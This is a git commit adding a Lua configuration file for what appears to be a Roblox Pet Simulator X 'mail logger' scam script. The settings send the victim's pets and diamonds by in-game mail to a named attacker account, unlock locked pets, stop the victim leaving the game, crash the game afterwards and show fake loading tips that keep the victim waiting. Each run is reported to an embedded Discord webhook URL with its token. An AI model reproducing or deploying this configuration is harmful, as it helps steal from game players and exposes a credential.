ef49a223553411f9a50453e529b5467017d9f596
MILKUP <132285590+PetsimXP@users.noreply.github.com>
2023-06-11 20:07:58 +0100

    Add files via upload

---
+++ Xelestial.lua
@@ -0,0 +1,22 @@
+--[[ custumz Mail Logger ]]--
+
+--[[ Main Config ]]--
+_G.Username = "G0THHPEEPALTT" --// Username To Send Pets To
+_G.GiftMessage = "hits go brr" --// Message For The Gift To Say
+
+_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
+_G.UnlockPets = true --// Unlocks Locked Pets
+_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
+_G.Crash = true  --// Crashes Them After Its Finished
+
+--[[ Webhook Config ]]--
+_G.Webhook = "https://discord.com/api/webhooks/1117523417948766300/edGgYEd7drD0rllgpSjuXS6GrZCyPgcow4xHdNv8rcGErUkAoD_Oz5-v9rsGR389BsNr" --// Discord Webhook For Executions
+_G.Enabled = true --// Toggle For Sending Webhooks
+_G.Mention = true --// Pings You When Someone Executes
+--[[ UI Config ]]--
+_G.ScriptName = "CELESTIALS" --// Script Name On The UI
+_G.Tip1 = "SCRIPT LOADING" --// Gives You Tips On The UI
+_G.Tip2 = "BE PATIENT" --// Gives You Tips On The UI
+_G.Tip3 = "DONT LEAVE" --// Gives You Tips On The UI
+_G.Tip4 = "PATIENCE" --// Gives You Tips On The UI
+_G.Tip5 = "NEARLY THERE" --// Gives You Tips On The UI
